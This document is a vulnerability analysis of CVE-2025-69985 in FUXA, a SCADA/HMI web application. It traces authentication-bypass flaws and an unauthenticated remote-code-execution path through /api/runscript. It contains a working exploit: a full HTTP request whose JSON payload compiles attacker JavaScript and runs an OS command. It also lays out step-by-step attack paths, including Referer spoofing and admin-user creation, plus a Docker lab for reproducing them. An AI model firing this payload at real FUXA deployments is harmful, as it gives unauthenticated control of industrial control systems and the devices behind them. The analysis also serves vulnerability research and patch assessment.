# Vulnerability Analysis: CVE-2025-69985

## CVE Metadata
- **CVE ID**: CVE-2025-69985
- **CWE**: CWE-288 (Authentication Bypass Using an Alternate Path or Channel)
- **CVSS**: 9.8 CRITICAL (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
- **Software**: FUXA ≤ 1.2.8 (frangoteam/FUXA)
- **Impact**: Unauthenticated Remote Code Execution

---

## Root Cause Analysis

### Primary Flaw: `verifyToken` Middleware Never Rejects Requests

**File**: `server/api/jwt-helper.js`, function `verifyToken()` (lines 44-77)

The `verifyToken` middleware, used by `verifyApiOrToken` (the auth middleware for ALL API endpoints), **never rejects a request**. When no `x-access-token` header is provided, it auto-generates a guest JWT and always calls `next()`:

```javascript
function verifyToken (req, res, next) {
    let token = req.headers['x-access-token'];
    if (!token) {
        token = getGuestToken();  // Auto-generate a valid guest token
    }
    if (token) {
        jwt.verify(token, secretCode, (err, decoded) => {
            if (err) {
                req.userId = "guest";
                req.userGroups = ["guest"];
            } else {
                req.userId = decoded.id;
                req.userGroups = decoded.groups;
            }
            next();  // ALWAYS passes - never rejects
        });
    } else {
        req.userId = null;
        req.userGroups = null;
        next();  // ALWAYS passes - never rejects
    }
}
```

This means the middleware is purely decorative — it sets user context but never enforces authentication.

### Secondary Flaw: `verifyApiOrToken` Skips All Auth When Security Disabled (DEFAULT)

**File**: `server/api/apikeys/verify-api-or-token.js` (lines 9-46)

The `verifyApiOrToken` middleware wraps `verifyToken`. Critically, when `secureEnabled` is `false` (the **DEFAULT** configuration), it immediately calls `next()` without any check:

```javascript
module.exports = function verifyApiOrToken(runtime) {
    return async function (req, res, next) {
        if (!runtime?.settings?.secureEnabled) {
            return next();  // DEFAULT: skip ALL authentication
        }
        // ... API key check ...
        return authJwt.verifyToken(req, res, next);
    };
};
```

### Tertiary Flaw: `verifyGroups` Grants Admin When Security Disabled

**File**: `server/api/index.js`, function `verifyGroups()` (lines 206-219)

When `secureEnabled` is `false`, `verifyGroups` returns `authJwt.adminGroups[0]` which is `-1` (admin permission level):

```javascript
function verifyGroups(req) {
    if (runtime.settings && runtime.settings.secureEnabled) {
        // ... per-user permission check ...
    } else {
        return authJwt.adminGroups[0];  // Returns -1 (admin) when security disabled
    }
}
```

### Quaternary Flaw: `requireAuth` Referer Header Bypass

**File**: `server/api/jwt-helper.js`, function `requireAuth()` (lines 79-122)

The `requireAuth` function (used by the Node-RED integration) trusts the HTTP `Referer` header to bypass JWT verification:

```javascript
function requireAuth (req, res, next) {
    const referer = req.headers.referer;
    if (referer) {
        const requestHost = req.headers.host;
        if (referer.startsWith(`http://${requestHost}`) || referer.startsWith(`https://${requestHost}`)) {
            return next();  // BYPASS: spoofed host match
        }
        const fuxaPatterns = ['/fuxa', '/editor', '/viewer', '/lab', '/home',
            'localhost:', '127.0.0.1:', '0.0.0.0:'];
        const hasFuxaReferer = fuxaPatterns.some(pattern => referer.includes(pattern));
        if (hasFuxaReferer) {
            return next();  // BYPASS: any URL containing '/fuxa' etc.
        }
    }
    // Only reaches JWT check if Referer bypass fails
}
```

### RCE Vector: Dynamic Code Compilation in `runTestScript`

**File**: `server/runtime/scripts/msm.js`, function `runTestScript()` (lines 43-56) and `_requireFromString()` (lines 139-145)

The `/api/runscript` endpoint accepts arbitrary JavaScript code via the `test` mechanism. When `script.test` is `true`, the code is compiled into a Node.js module using `Module._compile()` and executed directly:

```javascript
this.runTestScript = function (_script) {
    var tempScripts = JSON.parse(JSON.stringify(scriptsMap));
    tempScripts[_script.name] = _script;
    var result = _scriptsToModule(tempScripts, eventsIncludes);
    if (result.module) {
        var paramValues = _script.parameters.map(p => utils.isNullOrUndefined(p.value) ? p : p.value);
        result.module[initEvents.name](events, _script.outputId);
        return result.module[_script.name](...paramValues);  // Executes attacker code
    }
}
```

The code is wrapped into a function and compiled via:
```javascript
var _requireFromString = function (src, filename) {
    delete require.cache[filename];
    var m = new Module();
    m._compile(src, filename);  // Compiles attacker-controlled JavaScript
    return m.exports;
}
```

This gives the attacker full access to Node.js APIs including `require('child_process').execSync()`.

---

## Vulnerable Files and Functions

| File | Function | Line | Role |
|------|----------|------|------|
| `server/api/apikeys/verify-api-or-token.js` | `verifyApiOrToken()` | 9-46 | Auth middleware — skips auth when `secureEnabled=false` |
| `server/api/jwt-helper.js` | `verifyToken()` | 44-77 | JWT verification — NEVER rejects, always calls `next()` |
| `server/api/jwt-helper.js` | `requireAuth()` | 79-122 | Referer-based auth bypass |
| `server/api/index.js` | `verifyGroups()` | 206-219 | Returns admin permission when security disabled |
| `server/api/scripts/index.js` | `POST /api/runscript` | 33-55 | Route handler accepting script objects |
| `server/runtime/scripts/index.js` | `runScript()` | 69-84 | Script manager dispatching to `runTestScript` |
| `server/runtime/scripts/index.js` | `isAuthorised()` | 86-104 | Authorization check — passes when admin |
| `server/runtime/scripts/msm.js` | `runTestScript()` | 43-56 | Compiles and executes attacker-supplied JavaScript |
| `server/runtime/scripts/msm.js` | `_requireFromString()` | 139-145 | Uses `Module._compile()` for dynamic code execution |

---

## Triggering Input

### HTTP Request

```
POST /api/runscript HTTP/1.1
Host: <target>:1881
Content-Type: application/json
Referer: http://<target>:1881/fuxa

{
  "params": {
    "script": {
      "test": true,
      "name": "exploit",
      "code": "return require('child_process').execSync('id').toString()",
      "parameters": []
    }
  }
}
```

**Key fields in the payload:**
- `params.script.test: true` — routes execution to `runTestScript()` instead of running a saved script
- `params.script.name` — arbitrary function name (used as the key in the compiled module)
- `params.script.code` — arbitrary JavaScript code, compiled into a function body
- `params.script.parameters` — must be an array (can be empty); defines function parameters

The `Referer` header is included for completeness (needed for the `requireAuth` bypass path) but is **not required** for the primary `/api/runscript` attack when `secureEnabled=false` (default). The attack works without any headers beyond `Content-Type`.

**Compiled JavaScript (server-side):**
```javascript
const path = require('path');
var events; var id; var console = { log: function (msg) { if (events) events.emit('script-console', { msg: msg, type: 'log', id: id });}};
function init (_events, _id) { try { events = _events; id = _id } catch (fuxaError) { console.log(fuxaError); return JSON.stringify(fuxaError); } }
async function exploit () { try { return require('child_process').execSync('id').toString() } catch (fuxaError) { console.log(fuxaError); return JSON.stringify(fuxaError); } }
module.exports = { init: init, exploit: exploit, };
```

---

## Attack Scenario

### Path 1: Default Configuration (secureEnabled: false) — TRIVIAL RCE

1. **Reconnaissance**: Attacker identifies a FUXA instance on port 1881 (default)
2. **No authentication needed**: `secureEnabled` is `false` by default
3. **Send exploit**: POST to `/api/runscript` with the crafted JSON body
4. **Auth flow**:
   - `verifyApiOrToken` → `secureEnabled=false` → immediately passes
   - `verifyGroups` → security disabled → returns `-1` (admin)
   - `isAuthorised` → `admin=true` (permission === -1) → returns `true`
5. **Execution**: `runScript` → `script.test=true` → `runTestScript` → `_scriptsToModule` → `_requireFromString` → `Module._compile()` → arbitrary JavaScript executed
6. **Output**: Command output returned in HTTP response body

### Path 2: Secured Configuration (secureEnabled: true) — CONDITIONAL RCE

1. **Auth flow**:
   - `verifyApiOrToken` → security enabled → calls `verifyToken`
   - `verifyToken` → no token → auto-generates guest token → userId="guest" → `next()`
   - `verifyGroups` → returns guest permission (e.g., `["guest"]`)
   - `isAuthorised` → `admin=false` → calls `scriptModule.getScript(script)`
2. **Condition**: If the FUXA instance has ANY script saved with no explicit permission restrictions (default), and the attacker can obtain or guess its `id`, the `isAuthorised` check passes because `!st.permission` evaluates to `true` for scripts without a permission field
3. **Script enumeration**: `GET /api/project` is also accessible via `verifyApiOrToken` → `verifyToken` (never rejects) → project data including script definitions is exposed
4. **Execution**: Same as Path 1 from step 5 onward

### Path 3: Node-RED Integration — Referer Bypass RCE

1. If Node-RED integration is enabled, the `allowDashboard` middleware in `server/integrations/node-red/index.js` checks Referer before falling back to `requireAuth`
2. Setting `Referer: http://<target>:1881/fuxa` bypasses both the `allowDashboard` check AND the `requireAuth` JWT verification
3. Attacker gains access to Node-RED admin interface at `/nodered/`
4. Node-RED flows can execute arbitrary code via function nodes with full access to `child_process`, `fs`, etc.

---

## Impact

- **Remote Code Execution**: Full arbitrary JavaScript/OS command execution as the Node.js process user
- **Data Access**: Read/write access to all FUXA project data, SCADA/HMI configurations, device tags
- **User Takeover**: Can create admin users, overwrite user databases, modify authentication settings
- **Lateral Movement**: Access to ICS/SCADA devices managed by FUXA (Modbus, OPC-UA, BACnet, MQTT, S7, etc.)
- **Industrial Impact**: FUXA is a SCADA/HMI system — compromise can affect industrial control processes

---

## Authentication Requirements

**None** — this is a pre-authentication vulnerability.

- **Default state** (`secureEnabled: false`): NO authentication required whatsoever. All API endpoints are fully accessible.
- **Secured state** (`secureEnabled: true`): The `verifyToken` middleware never blocks requests. It auto-generates a guest JWT and always calls `next()`. The secondary `isAuthorised` check can be bypassed if any script exists without explicit permission restrictions.
- **No credentials needed**: No default passwords, API keys, or tokens required. The attack is fully unauthenticated.

---

## Fix Assessment

**The fix is incomplete.** The vulnerability has NO patched version.

### Fix Commits Analyzed

1. **`37f9876f`** — "security: fix auth bypass in heartbeat token refresh"
   - Adds `isAuthenticated` flag to `verifyToken`
   - Changes `getNewToken(headers)` → `getNewTokenFromRequest(req)` to prevent token forgery via `x-auth-user` header
   - **Does NOT fix**: The `verifyToken` function still never rejects requests. The `requireAuth` Referer bypass is preserved unchanged.

2. **`4246c40a`** — "feat: enforcing auth middleware and validating/sandboxing the destination path"
   - Hardens project API path handling only
   - **Does NOT fix**: Any of the authentication bypass issues

### Remaining Attack Surface

The Referer bypass in `requireAuth` (lines 79-98) is **identical** in the latest version (v1.2.11, master branch commit `427d2f63`). The `verifyToken` middleware still never rejects unauthenticated requests. The `/api/runscript` endpoint still accepts arbitrary code via the `test` mechanism.

### Why the Fix is Incomplete

1. **`verifyToken` never rejects**: The core middleware always passes requests through, regardless of authentication status. Adding `isAuthenticated` is merely informational — downstream handlers mostly ignore it.
2. **`requireAuth` Referer bypass intact**: The same Referer header check that was the original CVE-2023-33831 incomplete fix remains present in all versions through v1.2.11.
3. **Default `secureEnabled: false`**: The default configuration disables ALL authentication. Even with "fixes" applied, a fresh installation is trivially exploitable.
4. **No code execution sandboxing**: `runTestScript` uses `Module._compile()` with full Node.js access. There is no sandbox, no allowlist, no restriction on what code can execute.

---

## Related Attack Surface

### 1. `/api/runSysFunction` Endpoint
**File**: `server/api/scripts/index.js` (line 60)

Same middleware chain as `/api/runscript`. With `secureEnabled=false`, executes system functions with admin permissions. While limited to predefined functions (`$getTag`, `$setTag`, etc.), it exposes full read/write access to SCADA device tags.

### 2. `/api/project` Endpoint (Data Exfiltration)
**File**: `server/api/projects/index.js` (line 35)

Accessible via `verifyApiOrToken` → returns complete project data including scripts, devices, configurations. Enables script ID enumeration for Path 2 attacks.

### 3. `/api/users` Endpoint (User Takeover)
**File**: `server/api/users/index.js` (lines 31, 62, 87)

With `secureEnabled=false`, allows creating/modifying/deleting users with admin permissions. Attacker can create admin accounts.

### 4. `/api/settings` Endpoint (Security Toggle)
**File**: `server/api/index.js` (line 122)

Uses `authMiddleware` (verifyApiOrToken). With `secureEnabled=false`, allows modifying server settings. Attacker can toggle security settings.

### 5. Node-RED Integration — Referer Bypass
**File**: `server/integrations/node-red/index.js` (lines 124-145)

The `allowDashboard` middleware has its own Referer check (line 138-143) with patterns `/editor`, `/viewer`, `/lab`, `/home`, `/fuxa`, `/flows`, `/nodered` — all bypassable via spoofed Referer. Falls back to `requireAuth` which has the same Referer bypass. Node-RED provides additional code execution capabilities via function nodes with `child_process` in global context (line 102).

### 6. ALL API Endpoints
**File**: `server/api/index.js` (lines 49-74)

Every API module (projects, users, alarms, plugins, diagnose, daq, scheduler, scripts, resources, commands, reports, apikeys) uses `verifyApiOrToken` as the auth middleware. With `secureEnabled=false`, ALL are accessible without authentication with admin permissions.

---

## Build System & Lab Requirements

### Build System
- **Type**: npm (Node.js)
- **Runtime**: Node.js 18 (as per Dockerfile base image `node:18-bookworm`)
- **Entry Point**: `server/main.js`
- **Start Command**: `npm start` → `node main.js`

### Build Commands
```bash
# Option 1: Use official Docker image (RECOMMENDED for lab)
docker pull frangoteam/fuxa:1.2.8

# Option 2: Build from source
cd server/
npm install --no-audit --no-fund
npm start
```

### Dependencies
- `node:18-bookworm` base image (or Node.js 18.x)
- npm dependencies in `server/package.json` (installed via `npm install`)
- Key runtime deps: express, jsonwebtoken, sqlite3, bcryptjs, body-parser
- System deps (if building sqlite3 from source): `build-essential`, `sqlite3`, `libsqlite3-dev`

### Runtime Requirements
- **Port**: 1881 (TCP, HTTP)
- **No external services required** — FUXA is self-contained with SQLite
- **Data Volumes** (optional):
  - `_appdata/` — settings
  - `_db/` — SQLite databases
  - `_logs/` — logs
  - `_images/` — images

### Docker Lab Setup
```yaml
services:
  fuxa:
    image: frangoteam/fuxa:1.2.8
    ports:
      - '1881:1881'
    volumes:
      - './appdata:/usr/src/app/FUXA/server/_appdata'
      - './db:/usr/src/app/FUXA/server/_db'
```

To test with authentication enabled (demonstrating the auth bypass):
```bash
mkdir -p appdata
echo '{"secureEnabled":true,"secretCode":"frangoteam751","tokenExpiresIn":"1h"}' > appdata/mysettings.json
```

### Base Image Recommendation
Use `frangoteam/fuxa:1.2.8` from Docker Hub directly — it's the exact vulnerable version and avoids build complexity (ODBC drivers, sqlite3 compilation, etc.).
